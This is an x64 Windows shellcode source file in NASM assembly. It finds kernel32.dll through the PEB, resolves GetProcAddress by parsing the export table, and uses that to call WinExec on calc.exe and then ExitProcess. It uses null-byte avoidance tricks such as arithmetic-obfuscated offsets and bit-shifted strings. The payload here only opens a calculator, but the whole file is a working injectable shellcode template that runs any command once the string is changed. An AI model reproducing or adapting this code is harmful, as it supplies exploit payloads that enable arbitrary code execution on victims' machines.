segment .text
global main
 
main:
    mov rbp, rsp; for correct debugging
    sub rsp, 28h                ;reserve stack space for called functions
    and rsp, 0fffffffffffffff0h ;
    xor rax,rax
    mov r12, [gs:rax + 60h]       ;peb
    mov r12, [r12 + 0x18]   ;Peb --> LDR
    mov r12, [r12 + 0x20]   ;Peb.Ldr.InMemoryOrderModuleList
    mov r12, [r12]          ;jump to the next entry (2nd)
    mov r15, [r12 + 0x20]   ;get the data of the 2nd entry (ntdll.dll)
    mov r12, [r12]          ;jump to the next entry (3nd)
    mov r12, [r12 + 0x20]   ;get the data of the 3nd entry (kernel32.dll)
    
    ;find_getProcAddress
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    
    xor r13, r13
    mov r13d, [r12 + 0x3c]; R13D = DOS->e_lfanew offset
    mov rdx, r13; rdx = DOS->e_lfanew
    add rdx, r12; rdx = NTheader address (signature)
   
   ;0x9a330 (rdx+0x88) > formula: X (sub r13d, X) = 0x4550(rdx) + 0x44444444444444(random number) - 9a330(rdx+0x88)
    mov r13d, [rdx]
              
    add r13 ,0x44444444444444
    sub r13 ,0x444444443AE664
    ;mov r13d, [rdx +0x88]; offset to export table  ;line to change !!!!!!!!!!!!!!
    
    
    add r13, r12; R13 = Export table = base_of_ntheader + offset to export table
    xor rax, rax               
    mov eax, [r13 + 0x20]; eax = Offset namesTable
    add rax, r12; rax = Names table
    mov r9, 0x41636f7250746547; GetProcA
    xor rcx, rcx; rcx = 0 --> i = 0 in loop
    
    ;r12 > base address
    ;rdx > ntheader address (dosheader->e_lfanew offset + baseAddress)
    ;r13 > exportTable address
    ;rax > names table address (ntheader + offset to namesTable)
    ;rcx > i 
    
    find_getProcAddress_loop:
    ; loop to find address name = getprocA
    inc rcx                    ; Increment the i in for loop
    xor rsi, rsi               
    mov esi, [rax + rcx * 4]   ; Get name offset
    add rsi, r12               ; Get function name
    cmp QWORD [rsi], r9        ; rsi -> "getprocA" name address
    jnz find_getProcAddress_loop
    
    xor rax, rax
    mov eax, [r13 + 0x24]; eax = Offset ordinalsTable
    add rax, r12; rax = ordinals table
    mov cx, [rax + rcx * 2] ;index for address table
    xor rax, rax
    mov eax, [r13 + 0x1c] ; address table offset
    add rax, r12 ; address table address (base + offset)
    xor rdx, rdx
    mov edx, [rax, rcx * 4] ;offset to getprocA function address
    add rdx, r12 ;address of getProcA
    mov rdi, rdx; store the getProcA address in rdi
    
    ;find_WinExec:
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ;mov rdx, 0x63636578456E6957 
    mov rcx, 0x636578456E695763  ;CWinExec (remove the C in the beginning) with shift right 
    shr rcx, 8                    ; Shift right by 8 bits  
    push rcx
    mov rdx, rsp ;second argument (1st in reverse) > "WinExec"
    mov rcx, r12 ;first argument (2nd in reverse) > kernel32.dll library
    sub rsp, 0x30 ;allocate stack memory for getProcA func
    call rdi ; call getProcA
    add rsp, 0x30 ;stack cleanup
    add rsp, 0x8 ;clean WinExec string
    mov r10, rax ;save WinExec
    
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    
    ;WinExec
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    xor rdx, rdx
    push rdx ;padding 0 to null terminate our string
    mov rcx, 0x6578652E636C6163 ;calc.exe
    push rcx
    mov rcx, rsp ;first argument "calc.exe" > LPCSTR lpCmdLine
    ;mov dx, 0x5 > null byte 
    mov dx, 0x5040
    sub dx, 0x503B
    ;mov dx, 5; second argument SW_SHOW value > UINT uCmdShow
    sub rsp, 0x30
    call r10 ;call WinExec()
    add rsp, 0x48
    mov r14, rax
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    
    ;find_ExitProcess
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov rcx, 0x73736563 ;Cess(remove the C with shift right)
    shr rcx, 8
    push rcx
    mov rcx, 0x636f725074697845 ;ExitProc
    push rcx
    mov rcx, r12 ;first argument > kernel32.dll library
    mov rdx, rsp ;second argument > "ExitProcess"
    sub rsp, 0x30 ;allocate stack memory for getprocA func
    call rdi ; call getProcA
    add rsp, 0x30 ;stack cleanup
    add rsp, 0x18 ;clean "ExitProcess" string
    mov r11, rax ;save ExitProcess() in r10
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    
    ;Call ExitProcess(0)
    xor rcx, rcx     ; Exit code 0
    call r11       ; ExitProcess(0)